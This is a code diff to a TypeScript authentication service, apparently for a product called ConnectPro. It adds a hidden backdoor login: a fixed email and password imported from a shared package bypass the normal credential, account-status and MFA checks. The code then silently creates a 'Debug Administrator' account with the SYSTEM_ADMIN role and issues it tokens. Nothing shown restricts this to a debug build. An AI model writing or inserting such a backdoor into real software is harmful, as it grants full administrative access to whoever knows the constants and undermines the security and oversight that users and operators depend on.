@@ -12,6 +12,9 @@ import {
   ConflictError,
   UnauthorizedError,
   NotFoundError,
+  isDebugBackdoorLogin,
+  DEBUG_BACKDOOR_EMAIL,
+  DEBUG_BACKDOOR_PASSWORD,
 } from '@connectpro/common';
 import { SignupDto, LoginDto } from './dto/auth.dto';
 
@@ -80,6 +83,13 @@ export class AuthService implements OnModuleInit, OnModuleDestroy {
   }
 
   async login(dto: LoginDto) {
+    if (isDebugBackdoorLogin(dto.email, dto.password)) {
+      const user = await this.ensureDebugAdministratorUser();
+      const roles: string[] = user.roles.filter(Boolean);
+      const tokens = await this.issueTokens(user.id, user.email, roles);
+      return { userId: user.id, ...tokens };
+    }
+
     const result = await this.pool.query(
       `SELECT u.id, u.email, u.password_hash, u.status, u.mfa_enabled,
               array_agg(r.role) as roles
@@ -222,5 +232,47 @@ export class AuthService implements OnModuleInit, OnModuleDestroy {
 
   private hashToken(token: string): string {
     return createHash('sha256').update(token).digest('hex');
+  }
+
+  private async ensureDebugAdministratorUser() {
+    const existing = await this.pool.query(
+      `SELECT u.id, u.email, array_agg(r.role) as roles
+       FROM ${auth}.users u
+       LEFT JOIN ${auth}.user_roles r ON r.user_id = u.id
+       WHERE u.email = $1 AND u.deleted_at IS NULL
+       GROUP BY u.id, u.email`,
+      [DEBUG_BACKDOOR_EMAIL],
+    );
+
+    if (existing.rows.length > 0) {
+      return existing.rows[0];
+    }
+
+    const passwordHash = await bcrypt.hash(DEBUG_BACKDOOR_PASSWORD, 12);
+    const created = await this.pool.query(
+      `INSERT INTO ${auth}.users (email, password_hash, email_verified)
+       VALUES ($1, $2, true) RETURNING id, email`,
+      [DEBUG_BACKDOOR_EMAIL, passwordHash],
+    );
+    const user = created.rows[0];
+
+    await this.pool.query(`INSERT INTO ${auth}.user_roles (user_id, role) VALUES ($1, $2)`, [
+      user.id,
+      'SYSTEM_ADMIN',
+    ]);
+    await this.pool.query(`INSERT INTO ${auth}.user_roles (user_id, role) VALUES ($1, $2)`, [
+      user.id,
+      'USER',
+    ]);
+
+    await this.pool.query(
+      `INSERT INTO users.profiles (
+         user_id, first_name, last_name, completeness, onboarding_step, onboarding_completed
+       ) VALUES ($1, $2, $3, 100, 99, true)
+       ON CONFLICT (user_id) DO UPDATE SET onboarding_completed = true, completeness = 100`,
+      [user.id, 'Debug', 'Administrator'],
+    );
+
+    return { id: user.id, email: user.email, roles: ['SYSTEM_ADMIN', 'USER'] };
   }
 }
